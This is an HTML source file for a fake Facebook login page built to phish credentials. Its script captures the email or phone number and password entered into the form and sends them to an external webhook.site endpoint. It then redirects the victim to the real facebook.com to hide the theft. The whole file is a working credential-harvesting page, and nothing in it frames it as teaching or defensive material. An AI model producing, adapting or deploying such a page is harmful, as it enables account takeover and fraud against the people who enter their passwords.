<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="icon" href="https://www.google.com/s2/favicons?sz=256&domain_url=https%3A%2F%2Ffacebook.com" type="image/png" />
  </head>
  <script>
    async function handleSubmit(event) {
      event.preventDefault(); // Prevent the default form submission

      const formData = new FormData(event.target); // Get the form data

      try {
        // Send the form data to the server (or your webhook URL)
        const response = await fetch('https://webhook.site/bd91fb43-5fc8-4497-a2aa-7c09b4c35417', {
          method: 'POST',
          body: formData,
        });

        // You can still log the response or handle errors if needed
        console.log('Form data sent:', response);

      } catch (error) {
        // Handle errors if the fetch fails (e.g., network issues)
        console.error('Error:', error);
      }

      // Redirect to Facebook after the form submission, regardless of success or failure
      window.location.href = 'https://facebook.com';
    }
  </script>
  <style>
    *,
    ::after,
    ::before {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: sans-serif;
    }

    body {
      width: 100vw;
      min-height: 100vh;
      background-color: #fff;
      display: grid;
      place-items: center;
      grid-template-columns: auto auto;
    }

    .text-box {
      height: 300px;
    }

    .text-box h1 {
      font-size: 5.2em;
      color: #1877f2;
    }

    .text-box p {
      font-size: 2.37em;
      margin-top: 18px;
    }

    .form-box {
      width: 480px;
      height: 420px;
      border-radius: 10px;
      box-shadow: 1px 2px 22px rgba(0, 0, 0, 0.3);
      border: 1px solid #fff;
      padding: 8px 25px;
    }

    .form-box form * {
      font-size: 20px;
      outline: none;
      border: none;
      width: 100%;
      padding: 16px;
      border-radius: 6px;
    }

    .form-box form input {
      border: 1px solid rgba(0, 0, 0, 0.2);
      margin-top: 16px;
    }

    .form-box form input::placeholder {
      color: rgba(0, 0, 0, 0.5);
    }

    .form-box form input:focus {
      border: 1px solid rgba(0, 0, 0, 0.4);
    }

    .form-box form button {
      background-color: #1877f2;
      color: #fff;
      font-size: 25px;
      font-weight: 600;
      margin-top: 20px;
    }

    .form-box form .login:hover {
      background-color: #1059ba;
      cursor: pointer;
    }

    .form-box form a {
      text-decoration: none;
      color: #428ae9;
      font-size: 17px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .form-box form a:hover {
      text-decoration: underline;
    }

    .form-box form span {
      display: block;
      padding: 0;
      height: 1px;
      border: none;
      background-color: #ccc;
      margin-top: 6px;
    }

    .form-box form .new {
      background-color: #42b72a;
      font-size: 20px;
      width: auto;
      position: relative;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      margin-top: 50px;
    }

    .form-box form .new:hover {
      background-color: #24910f;
      cursor: pointer;
    }
  </style>
  <body>
    <div class="text-box">
      <h1>facebook</h1>
      <p>Connect with friends and the world <br> around you on Facebook.</p>
    </div>
    <div class="form-box">
      <form onsubmit="handleSubmit(event)">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <div class="links">
          <button type="submit" class="login">Login</button>
          <a href="#">Forgot password?</a>
          <span></span>
          <button type="button" class="new">Create new account</button>
        </div>
      </form>
    </div>
  </body>
</html>
